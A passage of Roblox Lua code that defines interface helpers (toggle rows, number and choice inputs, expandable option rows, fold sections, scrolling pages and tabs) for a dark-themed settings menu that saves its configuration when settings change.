local UI_TEXT_WHITE   = Color3.fromRGB(255,255,255)
local UI_TEXT_PRIMARY = Color3.fromRGB(255, 255, 255)
local UI_TEXT_DIM     = Color3.fromRGB(125,125,125)
local UI_TEXT_SECTION = Color3.fromRGB(255,255,255)
local UI_BTN_BG       = Color3.fromRGB(0,0,0)
local UI_TOGGLE_OFF   = Color3.fromRGB(0,0,0)
local UI_TOGGLE_KNOB  = Color3.fromRGB(128, 128, 128)
local UI_KNOB_ON      = Color3.fromRGB(255, 255, 255)
local UI_GRAD_TOP     = Color3.fromRGB(0,0,0)
local UI_GRAD_BOT     = Color3.fromRGB(0,0,0)


-- Apply saved colour scheme before any UI is built
pcall(applyAccentFromTheme)

local UI_TWEEN_FAST = TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
local UI_TWEEN_MED  = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)

-- UI STYLE HELPERS
local function uiCardStyle(f)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,12); c.Parent = f
    local s = Instance.new("UIStroke"); s.Thickness = 1; s.Color = UI_CARD_STROKE or Color3.fromRGB(45, 45, 45); s.Transparency = 0.45; s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Parent = f
    local g = Instance.new("UIGradient"); g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, UI_GRAD_TOP or Color3.fromRGB(25, 25, 25)),
        ColorSequenceKeypoint.new(1, UI_GRAD_BOT or Color3.fromRGB(10, 10, 10))
    }); g.Rotation = 45; g.Parent = f
end

local function uiSmallBtn(p)
    local b = Instance.new("TextButton")
    b.Position = p.Pos or UDim2.new(0,0,0,0); b.Size = p.Size or UDim2.new(0,40,0,23)
    b.BackgroundColor3 = p.Bg or UI_BTN_BG; b.BorderSizePixel = 0
    b.Text = p.Text or ""; b.TextColor3 = p.Col or UI_TEXT_DIM; b.TextSize = p.TS or 11
    b.Font = Enum.Font.GothamBold; b.AutoButtonColor = false; b.ZIndex = p.Z or 1; b.Parent = p.Parent
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,p.CR or 6); c.Parent = b
    return b
end

local function uiAccentBar(parent, on)
    local b = Instance.new("Frame")
    b.Position = UDim2.new(0,0,0.5,-11); b.Size = UDim2.new(0,3,0,22)
    b.BackgroundColor3 = on and UI_ACCENT or UI_TEXT_WHITE
    b.BackgroundTransparency = on and 0 or 1; b.BorderSizePixel = 0; b.Parent = parent
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,2); c.Parent = b
    return b
end

local function uiAutoCanvas(scroll)
    local lay = scroll:FindFirstChildOfClass("UIListLayout"); if not lay then return end
    local pad = scroll:FindFirstChildOfClass("UIPadding")
    local function upd()
        local padBottom = (pad and pad.PaddingBottom.Offset or 0)
        local padTop = (pad and pad.PaddingTop.Offset or 0)
        local h = lay.AbsoluteContentSize.Y + padBottom + padTop + 24
        scroll.CanvasSize = UDim2.new(0, 0, 0, math.max(h, 1))
    end
    lay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(upd)
    task.defer(upd)
    task.delay(0.15, upd)
    task.delay(0.5, upd)
end

local function uiSectionHeader(parent, text)
    local r = Instance.new("Frame"); r.Size = UDim2.new(1,0,0,24); r.BackgroundTransparency = 1; r.Parent = parent
    local b = Instance.new("Frame"); b.Position = UDim2.new(0,0,0.5,-6); b.Size = UDim2.new(0,3,0,13)
    b.BackgroundColor3 = UI_ACCENT; b.BorderSizePixel = 0; b.Parent = r
    Instance.new("UICorner",b).CornerRadius = UDim.new(0,2)
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0,12,0,0); l.Size = UDim2.new(1,-12,1,0)
    l.BackgroundTransparency = 1; l.Text = text; l.TextColor3 = UI_TEXT_SECTION; l.TextSize = 11
    l.Font = Enum.Font.GothamBold; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r
    return r
end

local function uiInputRow(parent, label, def, hidden)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
    r.BackgroundColor3 = UI_ROW_BG; r.BackgroundTransparency = 0.1; r.BorderSizePixel = 0
    if hidden then r.Visible = false end; r.Parent = parent; uiCardStyle(r)
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0,13,0,0); l.Size = UDim2.new(1,-84,1,0)
    l.BackgroundTransparency = 1; l.Text = label; l.TextColor3 = UI_TEXT_PRIMARY; l.TextSize = 13
    l.Font = Enum.Font.GothamMedium; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r
    local bx = Instance.new("TextBox"); bx.Position = UDim2.new(1,-66,0.5,-12); bx.Size = UDim2.new(0,56,0,25)
    bx.BackgroundColor3 = UI_BTN_BG; bx.BorderSizePixel = 0; bx.Text = tostring(def); bx.TextColor3 = UI_ACCENT
    bx.TextSize = 13; bx.Font = Enum.Font.GothamBold; bx.Parent = r
    Instance.new("UICorner",bx).CornerRadius = UDim.new(0,6)
    return r, bx
end

local function uiToggleRow(parent, label, on, callback)
    local r = Instance.new("Frame")
    r.ClipsDescendants = true
    r.Size = UDim2.new(1, 0, 0, 48)
    r.BackgroundColor3 = UI_ROW_BG
    r.BackgroundTransparency = 0.08
    r.BorderSizePixel = 0
    r.Parent = parent
    uiCardStyle(r)

    local bar = uiAccentBar(r, on)

    local l = Instance.new("TextLabel")
    l.Position = UDim2.new(0, 14, 0, 0)
    l.Size = UDim2.new(1, -90, 1, 0)
    l.BackgroundTransparency = 1
    l.Text = label
    l.TextColor3 = UI_TEXT_PRIMARY
    l.TextSize = 14
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = r

    local track = Instance.new("Frame")
    track.Name = "SwitchTrack"
    track.Position = UDim2.new(1, -72, 0.5, -13)
    track.Size = UDim2.new(0, 58, 0, 26)
    track.BackgroundColor3 = on and UI_ACCENT or Color3.fromRGB(32, 32, 40)
    track.BorderSizePixel = 0
    track.Active = false
    track.Parent = r
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
    local trackStroke = Instance.new("UIStroke", track)
    trackStroke.Thickness = 1.2
    trackStroke.Color = on and UI_ACCENT or Color3.fromRGB(90, 90, 100)
    trackStroke.Transparency = on and 0.15 or 0.35

    local knob = Instance.new("Frame")
    knob.Name = "SwitchKnob"
    knob.Size = UDim2.new(0, 20, 0, 20)
    knob.BorderSizePixel = 0
    knob.Position = on and UDim2.new(1, -23, 0.5, -10) or UDim2.new(0, 3, 0.5, -10)
    knob.BackgroundColor3 = on and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(160, 160, 170)
    knob.Active = false
    knob.Parent = track
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    local stateLbl = Instance.new("TextLabel")
    stateLbl.Name = "SwitchState"
    stateLbl.BackgroundTransparency = 1
    stateLbl.Size = UDim2.new(1, 0, 1, 0)
    stateLbl.Font = Enum.Font.GothamBlack
    stateLbl.TextSize = 9
    stateLbl.Text = on and "ON" or "OFF"
    stateLbl.TextColor3 = on and Color3.fromRGB(20, 20, 24) or Color3.fromRGB(170, 170, 180)
    stateLbl.Active = false
    stateLbl.Parent = track

    -- Boton de click solo sobre el switch (no cubre toda la fila)
    local tb = Instance.new("TextButton")
    tb.Position = UDim2.new(1, -72, 0.5, -13)
    tb.Size = UDim2.new(0, 58, 0, 26)
    tb.BackgroundTransparency = 1
    tb.Text = ""
    tb.AutoButtonColor = false
    tb.ZIndex = 6
    tb.Parent = r

    -- Tambien click en la etiqueta / fila
    local rowBtn = Instance.new("TextButton")
    rowBtn.Position = UDim2.new(0, 0, 0, 0)
    rowBtn.Size = UDim2.new(1, -80, 1, 0)
    rowBtn.BackgroundTransparency = 1
    rowBtn.Text = ""
    rowBtn.AutoButtonColor = false
    rowBtn.ZIndex = 5
    rowBtn.Parent = r

    local state = on and true or false
    local function set(v)
        state = v and true or false
        local offBg = Color3.fromRGB(32, 32, 40)
        local onBg = UI_ACCENT
        pcall(function()
            TweenService:Create(track, UI_TWEEN_FAST, {BackgroundColor3 = state and onBg or offBg}):Play()
            TweenService:Create(knob, UI_TWEEN_FAST, {
                Position = state and UDim2.new(1, -23, 0.5, -10) or UDim2.new(0, 3, 0.5, -10),
                BackgroundColor3 = state and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(160, 160, 170),
            }):Play()
            TweenService:Create(trackStroke, UI_TWEEN_FAST, {
                Color = state and UI_ACCENT or Color3.fromRGB(90, 90, 100),
                Transparency = state and 0.1 or 0.35,
            }):Play()
            TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = state and 0 or 1}):Play()
            bar.BackgroundColor3 = UI_ACCENT
        end)
        stateLbl.Text = state and "ON" or "OFF"
        stateLbl.TextColor3 = state and Color3.fromRGB(20, 20, 24) or Color3.fromRGB(170, 170, 180)
    end

    local function fireToggle()
        set(not state)
        if callback then
            pcall(callback, state)
        end
        pcall(saveCherryConfig)
    end

    tb.MouseButton1Click:Connect(fireToggle)
    rowBtn.MouseButton1Click:Connect(fireToggle)
    return r, set
end

local function uiActionRow(parent, label, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,42)
    r.BackgroundColor3 = UI_ROW_BG; r.BackgroundTransparency = 0.1; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,1,0); btn.BackgroundTransparency = 1
    btn.Text = label; btn.TextColor3 = UI_TEXT_PRIMARY; btn.TextSize = 14; btn.Font = Enum.Font.GothamBold; btn.Parent = r
    local bar = uiAccentBar(r, false)

    btn.MouseButton1Click:Connect(function()
        bar.BackgroundColor3 = UI_ACCENT
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = 0}):Play()
        task.delay(0.3, function() TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = 1}):Play() end)
        if callback then callback() end
    end)
    return r, btn
end

local function uiNumberRow(parent, label, value, minV, maxV, callback)
    local r, bx = uiInputRow(parent, label, value)
    bx.FocusLost:Connect(function()
        local n = tonumber(bx.Text)
        if n and n >= minV and n <= maxV then
            if callback then callback(n) end
            saveCherryConfig()
        else
            bx.Text = tostring(value)
        end
    end)
    return r, bx
end

local function uiChoiceRow(parent, label, options, defaultIndex, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
    r.BackgroundColor3 = UI_ROW_BG; r.BackgroundTransparency = 0.1; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.43,0,0,44); l.BackgroundTransparency=1
    l.Text=label; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
    local la = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-174,0,8), Size=UDim2.new(0,29,0,27), Text="<", Col=UI_TEXT_PRIMARY, TS=13, CR=7})
    local vl = Instance.new("TextLabel"); vl.Position=UDim2.new(1,-141,0,8); vl.Size=UDim2.new(0,102,0,27)
    vl.BackgroundColor3=UI_BTN_BG; vl.BorderSizePixel=0; vl.Text=options[defaultIndex or 1]; vl.TextColor3=UI_TEXT_PRIMARY; vl.TextSize=10; vl.Font=Enum.Font.GothamBold; vl.Parent=r
    Instance.new("UICorner",vl).CornerRadius=UDim.new(0,7)
    local ra = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-35,0,8), Size=UDim2.new(0,29,0,27), Text=">", Col=UI_TEXT_PRIMARY, TS=13, CR=7})
    local idx = defaultIndex or 1
    local function upd()
        vl.Text = options[idx]
        if callback then callback(options[idx]) end
        saveCherryConfig()
    end
    la.MouseButton1Click:Connect(function() idx=idx-1; if idx<1 then idx=#options end; upd() end)
    ra.MouseButton1Click:Connect(function() idx=idx+1; if idx>#options then idx=1 end; upd() end)
    local function setVal(v)
        for i,o in ipairs(options) do if o==v then idx=i; vl.Text=o; break end end
    end
    return r, setVal
end

local ARROW_GLOW_TRANSPARENCY = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0.82, 0),
    NumberSequenceKeypoint.new(0.28, 0.06, 0),
    NumberSequenceKeypoint.new(0.52, 0.22, 0),
    NumberSequenceKeypoint.new(1, 0.82, 0),
})

local function styleArrowButton(arrow)
    -- AdaptHub-style glowing outline for ARROWS ONLY
    local border = Instance.new("UIStroke")
    border.Name = "AnimatedArrowBorder"
    border.Color = Color3.fromRGB(255, 255, 255)
    border.Thickness = 1.8
    border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    border.Transparency = 0.05
    border.Parent = arrow
    local bg = Instance.new("UIGradient")
    bg.Rotation = 135
    bg.Transparency = ARROW_GLOW_TRANSPARENCY
    bg.Parent = border

    local glow = Instance.new("UIStroke")
    glow.Name = "AnimatedArrowGlow"
    glow.Color = Color3.fromRGB(255, 255, 255)
    glow.Thickness = 3.6
    glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    glow.Transparency = 0.58
    glow.Parent = arrow
    local gg = Instance.new("UIGradient")
    gg.Name = "GlowGradient"
    gg.Rotation = 180
    gg.Transparency = ARROW_GLOW_TRANSPARENCY
    gg.Parent = glow
end

local function styleOptionChip(btn, active)
    -- Black text + white outline so V1/V2/V3 stay readable
    btn.TextColor3 = Color3.fromRGB(0, 0, 0)
    btn.BackgroundColor3 = active and UI_ACCENT or Color3.fromRGB(220, 220, 225)
    local stroke = btn:FindFirstChildOfClass("UIStroke")
    if not stroke then
        stroke = Instance.new("UIStroke")
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = btn
    end
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Thickness = active and 2 or 1.4
    stroke.Transparency = 0
    local ts = btn:FindFirstChildOfClass("UIStroke")
    -- text outline via second stroke on a label is hard; use TextStroke
    btn.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextStrokeTransparency = 0
end

local function uiExpandToggleRow(parent, label, on, options, defaultIndex, onToggle, onOption)
    -- Everything stacks UNDER the main row when the arrow is opened
    local container = Instance.new("Frame")
    container.BackgroundTransparency = 1
    container.Size = UDim2.new(1, 0, 0, 46)
    container.AutomaticSize = Enum.AutomaticSize.Y
    container.ClipsDescendants = false
    container.Parent = parent

    local col = Instance.new("UIListLayout")
    col.FillDirection = Enum.FillDirection.Vertical
    col.SortOrder = Enum.SortOrder.LayoutOrder
    col.Padding = UDim.new(0, 6)
    col.Parent = container

    -- MAIN ROW (toggle + arrow)
    local r = Instance.new("Frame")
    r.LayoutOrder = 1
    r.ClipsDescendants = true
    r.Size = UDim2.new(1, 0, 0, 46)
    r.BackgroundColor3 = UI_ROW_BG
    r.BackgroundTransparency = 0.1
    r.BorderSizePixel = 0
    r.Parent = container
    uiCardStyle(r)

    local bar = uiAccentBar(r, on)
    local l = Instance.new("TextLabel")
    l.Position = UDim2.new(0, 14, 0, 0)
    l.Size = UDim2.new(1, -110, 1, 0)
    l.BackgroundTransparency = 1
    l.Text = label
    l.TextColor3 = UI_TEXT_PRIMARY
    l.TextSize = 14
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = r

    local expanded = false
    local arrow = Instance.new("TextButton")
    arrow.Name = "ArrowButton"
    arrow.Position = UDim2.new(1, -100, 0.5, -13)
    arrow.Size = UDim2.new(0, 36, 0, 26)
    arrow.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
    arrow.BackgroundTransparency = 0.1
    arrow.BorderSizePixel = 0
    arrow.Text = "▼"
    arrow.TextColor3 = Color3.fromRGB(255, 255, 255)
    arrow.TextSize = 14
    arrow.Font = Enum.Font.GothamBlack
    arrow.AutoButtonColor = false
    arrow.Parent = r
    Instance.new("UICorner", arrow).CornerRadius = UDim.new(0, 7)
    styleArrowButton(arrow)

    arrow.ZIndex = 8
    local track = Instance.new("Frame")
    track.Name = "SwitchTrack"
    track.Position = UDim2.new(1, -54, 0.5, -13)
    track.Size = UDim2.new(0, 50, 0, 26)
    track.BackgroundColor3 = on and UI_ACCENT or Color3.fromRGB(32, 32, 40)
    track.BorderSizePixel = 0
    track.Active = false
    track.ZIndex = 3
    track.Parent = r
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
    local trackStroke = Instance.new("UIStroke", track)
    trackStroke.Thickness = 1.2
    trackStroke.Color = on and UI_ACCENT or Color3.fromRGB(90, 90, 100)
    trackStroke.Transparency = on and 0.15 or 0.35
    local knob = Instance.new("Frame")
    knob.Size = UDim2.new(0, 20, 0, 20)
    knob.BorderSizePixel = 0
    knob.Position = on and UDim2.new(1, -23, 0.5, -10) or UDim2.new(0, 3, 0.5, -10)
    knob.BackgroundColor3 = on and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(160, 160, 170)
    knob.Active = false
    knob.ZIndex = 4
    knob.Parent = track
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
    local stateLbl = Instance.new("TextLabel")
    stateLbl.BackgroundTransparency = 1
    stateLbl.Size = UDim2.new(1, 0, 1, 0)
    stateLbl.Font = Enum.Font.GothamBlack
    stateLbl.TextSize = 9
    stateLbl.Text = on and "ON" or "OFF"
    stateLbl.TextColor3 = on and Color3.fromRGB(20, 20, 24) or Color3.fromRGB(170, 170, 180)
    stateLbl.Active = false
    stateLbl.ZIndex = 4
    stateLbl.Parent = track
    -- Solo el area del switch (NO cubrir flecha)
    local tb = Instance.new("TextButton")
    tb.Position = UDim2.new(1, -54, 0.5, -13)
    tb.Size = UDim2.new(0, 50, 0, 26)
    tb.BackgroundTransparency = 1
    tb.Text = ""
    tb.AutoButtonColor = false
    tb.ZIndex = 6
    tb.Parent = r

    -- OPTIONS ROW (under main row when expanded)
    -- Scrollable when many options (e.g. animation packs)
    local useScroll = #options > 4
    local optFrame = Instance.new("Frame")
    optFrame.LayoutOrder = 2
    optFrame.Size = UDim2.new(1, 0, 0, useScroll and 140 or 40)
    optFrame.BackgroundColor3 = UI_ROW_BG
    optFrame.BackgroundTransparency = 0.12
    optFrame.BorderSizePixel = 0
    optFrame.Visible = false
    optFrame.ClipsDescendants = true
    optFrame.Parent = container
    uiCardStyle(optFrame)

    local optPad = Instance.new("UIPadding")
    optPad.PaddingLeft = UDim.new(0, 8)
    optPad.PaddingRight = UDim.new(0, 8)
    optPad.PaddingTop = UDim.new(0, 6)
    optPad.PaddingBottom = UDim.new(0, 6)
    optPad.Parent = optFrame

    local optParent = optFrame
    if useScroll then
        local scroll = Instance.new("ScrollingFrame")
        scroll.Name = "OptionsScroll"
        scroll.Size = UDim2.new(1, -4, 1, -4)
        scroll.Position = UDim2.new(0, 2, 0, 2)
        scroll.BackgroundTransparency = 1
        scroll.BorderSizePixel = 0
        scroll.ScrollBarThickness = 5
        scroll.ScrollBarImageColor3 = UI_ACCENT
        scroll.ScrollingDirection = Enum.ScrollingDirection.Y
        scroll.ElasticBehavior = Enum.ElasticBehavior.Always
        scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
        scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
        scroll.Parent = optFrame
        local sPad = Instance.new("UIPadding")
        sPad.PaddingLeft = UDim.new(0, 6)
        sPad.PaddingRight = UDim.new(0, 8)
        sPad.PaddingTop = UDim.new(0, 4)
        sPad.PaddingBottom = UDim.new(0, 8)
        sPad.Parent = scroll
        local sLay = Instance.new("UIListLayout")
        sLay.FillDirection = Enum.FillDirection.Vertical
        sLay.Padding = UDim.new(0, 5)
        sLay.SortOrder = Enum.SortOrder.LayoutOrder
        sLay.Parent = scroll
        optParent = scroll
    else
        local optLayout = Instance.new("UIListLayout")
        optLayout.FillDirection = Enum.FillDirection.Horizontal
        optLayout.Padding = UDim.new(0, 6)
        optLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        optLayout.SortOrder = Enum.SortOrder.LayoutOrder
        optLayout.Parent = optFrame
    end

    -- MODE SETTINGS (under options when a mode is selected + expanded)
    local settingsHost = Instance.new("Frame")
    settingsHost.Name = "ModeSettings"
    settingsHost.LayoutOrder = 3
    settingsHost.Size = UDim2.new(1, 0, 0, 0)
    settingsHost.AutomaticSize = Enum.AutomaticSize.Y
    settingsHost.BackgroundTransparency = 1
    settingsHost.Visible = false
    settingsHost.Parent = container

    local settingsLayout = Instance.new("UIListLayout")
    settingsLayout.Padding = UDim.new(0, 6)
    settingsLayout.SortOrder = Enum.SortOrder.LayoutOrder
    settingsLayout.Parent = settingsHost

    local idx = defaultIndex or 1
    local optionBtns = {}
    local state = on
    local modeSettings = {}

    local function refreshOptionVisuals()
        for i, b in ipairs(optionBtns) do
            styleOptionChip(b, i == idx)
        end
    end

    local function refreshModeSettings()
        local any = false
        for lab, fr in pairs(modeSettings) do
            local show = expanded and (lab == options[idx])
            fr.Visible = show
            if show then any = true end
        end
        settingsHost.Visible = any
        -- container height follows AutomaticSize + list layout
    end

    for i, opt in ipairs(options) do
        local b = Instance.new("TextButton")
        b.LayoutOrder = i
        if useScroll then
            b.Size = UDim2.new(1, -4, 0, 30)
        else
            b.Size = UDim2.new(0, math.max(56, #tostring(opt) * 9 + 18), 0, 28)
        end
        b.BorderSizePixel = 0
        b.Text = tostring(opt)
        b.TextSize = useScroll and 12 or 12
        b.Font = Enum.Font.GothamBlack
        b.TextXAlignment = useScroll and Enum.TextXAlignment.Left or Enum.TextXAlignment.Center
        b.AutoButtonColor = false
        b.Parent = optParent
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
        if useScroll then
            local p = Instance.new("UIPadding")
            p.PaddingLeft = UDim.new(0, 10)
            p.Parent = b
        end
        styleOptionChip(b, i == idx)
        b.MouseButton1Click:Connect(function()
            idx = i
            refreshOptionVisuals()
            refreshModeSettings()
            if onOption then onOption(options[idx]) end
            saveCherryConfig()
        end)
        optionBtns[i] = b
    end

    local function setExpanded(v)
        expanded = v
        optFrame.Visible = v
        arrow.Text = v and "▲" or "▼"
        refreshModeSettings()
    end

    arrow.MouseButton1Click:Connect(function()
        setExpanded(not expanded)
    end)

    local function set(v)
        state = v
        local offBg = UI_TOGGLE_OFF or Color3.fromRGB(28, 28, 34)
        TweenService:Create(track, UI_TWEEN_FAST, {BackgroundColor3 = v and UI_ACCENT or offBg}):Play()
        TweenService:Create(knob, UI_TWEEN_FAST, {
            Position = v and UDim2.new(1, -23, 0.5, -10) or UDim2.new(0, 3, 0.5, -10),
            BackgroundColor3 = v and Color3.fromRGB(255, 255, 255) or (UI_TOGGLE_KNOB or Color3.fromRGB(160, 160, 170)),
        }):Play()
        TweenService:Create(trackStroke, UI_TWEEN_FAST, {
            Color = v and UI_ACCENT or Color3.fromRGB(90, 90, 100),
            Transparency = v and 0.1 or 0.35,
        }):Play()
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = v and 0 or 1}):Play()
        bar.BackgroundColor3 = UI_ACCENT
        stateLbl.Text = v and "ON" or "OFF"
        stateLbl.TextColor3 = v and Color3.fromRGB(20, 20, 24) or Color3.fromRGB(170, 170, 180)
    end

    tb.MouseButton1Click:Connect(function()
        set(not state)
        if onToggle then onToggle(state) end
        saveCherryConfig()
    end)

    local function setOption(v)
        for i, o in ipairs(options) do
            if o == v then
                idx = i
                refreshOptionVisuals()
                refreshModeSettings()
                break
            end
        end
    end

    local function registerModeSettings(optionLabel, frame)
        frame.Parent = settingsHost
        frame.Visible = false
        frame.Size = UDim2.new(1, 0, 0, 0)
        frame.AutomaticSize = Enum.AutomaticSize.Y
        modeSettings[optionLabel] = frame
        task.defer(refreshModeSettings)
    end

    return container, set, setOption, registerModeSettings, function() return options[idx] end
end

local function uiFoldSection(parent, title)
    local wrap = Instance.new("Frame")
    wrap.Name = "Fold_" .. tostring(title):gsub("%s+", "")
    wrap.BackgroundTransparency = 1
    wrap.Size = UDim2.new(1, 0, 0, 0)
    wrap.AutomaticSize = Enum.AutomaticSize.Y
    wrap.ClipsDescendants = false
    wrap.Parent = parent
    local wLay = Instance.new("UIListLayout")
    wLay.Padding = UDim.new(0, 6)
    wLay.SortOrder = Enum.SortOrder.LayoutOrder
    wLay.Parent = wrap

    local header = Instance.new("Frame")
    header.LayoutOrder = 1
    header.Size = UDim2.new(1, 0, 0, 42)
    header.BackgroundColor3 = UI_ROW_BG
    header.BackgroundTransparency = 0.05
    header.BorderSizePixel = 0
    header.Parent = wrap
    uiCardStyle(header)

    local lbl = Instance.new("TextLabel")
    lbl.Position = UDim2.new(0, 14, 0, 0)
    lbl.Size = UDim2.new(1, -56, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = title
    lbl.TextColor3 = UI_TEXT_PRIMARY
    lbl.TextSize = 14
    lbl.Font = Enum.Font.GothamBold
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = header

    local arrow = Instance.new("TextButton")
    arrow.Name = "FoldArrow"
    arrow.Position = UDim2.new(1, -44, 0.5, -13)
    arrow.Size = UDim2.new(0, 34, 0, 26)
    arrow.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
    arrow.BackgroundTransparency = 0.1
    arrow.BorderSizePixel = 0
    arrow.Text = "▼"
    arrow.TextColor3 = Color3.fromRGB(255, 255, 255)
    arrow.TextSize = 14
    arrow.Font = Enum.Font.GothamBlack
    arrow.AutoButtonColor = false
    arrow.Parent = header
    Instance.new("UICorner", arrow).CornerRadius = UDim.new(0, 7)
    pcall(function() styleArrowButton(arrow) end)

    local body = Instance.new("Frame")
    body.LayoutOrder = 2
    body.BackgroundTransparency = 1
    body.Size = UDim2.new(1, 0, 0, 0)
    body.AutomaticSize = Enum.AutomaticSize.Y
    body.Visible = false
    body.Parent = wrap
    local bLay = Instance.new("UIListLayout")
    bLay.Padding = UDim.new(0, 6)
    bLay.SortOrder = Enum.SortOrder.LayoutOrder
    bLay.Parent = body

    local expanded = false
    local function toggle()
        expanded = not expanded
        body.Visible = expanded
        arrow.Text = expanded and "▲" or "▼"
    end
    arrow.Activated:Connect(toggle)
    local hit = Instance.new("TextButton")
    hit.Size = UDim2.new(1, -50, 1, 0)
    hit.BackgroundTransparency = 1
    hit.Text = ""
    hit.Parent = header
    hit.Activated:Connect(toggle)
    return body
end

local function uiMakePage(parent, name, order, vis)
    local p = Instance.new("ScrollingFrame"); p.Name=name; p.Visible=vis~=false; p.LayoutOrder=order
    p.Size=UDim2.new(1,0,1,0); p.BackgroundTransparency=1; p.BorderSizePixel=0
    p.ScrollBarThickness=8
    p.ScrollBarImageColor3=UI_ACCENT
    p.ScrollBarImageTransparency=0.15
    p.ScrollingEnabled=true
    p.ScrollingDirection=Enum.ScrollingDirection.Y
    p.ElasticBehavior=Enum.ElasticBehavior.Always
    p.AutomaticCanvasSize=Enum.AutomaticSize.Y
    p.CanvasSize=UDim2.new(0,0,0,0)
    p.Parent=parent
    local l = Instance.new("UIListLayout"); l.Padding=UDim.new(0,7); l.SortOrder=Enum.SortOrder.LayoutOrder; l.Parent=p
    local pd = Instance.new("UIPadding")
    pd.PaddingTop=UDim.new(0,4)
    pd.PaddingBottom=UDim.new(0,40)
    pd.PaddingRight=UDim.new(0,6)
    pd.PaddingLeft=UDim.new(0,2)
    pd.Parent=p
    uiAutoCanvas(p)
    return p
end

local function uiMakeTab(parent, name, text, pos, active)
    local b = Instance.new("TextButton"); b.Name=name; b.ZIndex=9
    if pos then b.Position=pos end; b.Size = UDim2.new(0,80,1,0)
    b.BackgroundColor3 = active and UI_ACCENT or Color3.fromRGB(22, 22, 28)
    b.BackgroundTransparency = active and 0.12 or 0.25
    b.BorderSizePixel=0
    b.Text=text
    -- Active / pressed look: black text + white contour
    b.TextColor3 = active and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(235,235,245)
    b.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
    b.TextStrokeTransparency = active and 0.15 or 1
    b.TextTransparency=0
    b.TextSize=12; b.Font=Enum.Font.GothamBlack; b.AutoButtonColor=false; b.Parent=parent
    Instance.new("UICorner",b).CornerRadius=UDim.new(0,10)
    local stroke = Instance.new("UIStroke"); stroke.Name="TabStroke"
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Thickness = active and 2 or 1
    stroke.Transparency = active and 0 or 0.55
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = b
    b:SetAttribute("IsActiveTab", active and true or false)
    b.MouseEnter:Connect(function()
        if not b:GetAttribute("IsActiveTab") then
            TweenService:Create(b, UI_TWEEN_FAST, {
                BackgroundColor3 = UI_ACCENT,
                BackgroundTransparency = 0.45,
                TextColor3 = Color3.fromRGB(0, 0, 0)
            }):Play()
            local st = b:FindFirstChild("TabStroke")
            if st then st.Transparency = 0.15; st.Thickness = 1.6 end
            b.TextStrokeTransparency = 0.25
        end
    end)
    b.MouseLeave:Connect(function()
        if not b:GetAttribute("IsActiveTab") then
            TweenService:Create(b, UI_TWEEN_FAST, {
                BackgroundColor3 = Color3.fromRGB(22, 22, 28),
                BackgroundTransparency = 0.25,
                TextColor3 = Color3.fromRGB(235,235,245)
            }):Play()
            local st = b:FindFirstChild("TabStroke")
            if st then st.Transparency = 0.55; st.Thickness = 1 end
            b.TextStrokeTransparency = 1
        end
    end)
    b.MouseButton1Down:Connect(function()
        b.TextColor3 = Color3.fromRGB(0, 0, 0)
        b.TextStrokeTransparency = 0.1
        local st = b:FindFirstChild("TabStroke")
        if st then
            st.Color = Color3.fromRGB(255, 255, 255)
            st.Transparency = 0
            st.Thickness = 2
        end
    end)
    return b
end

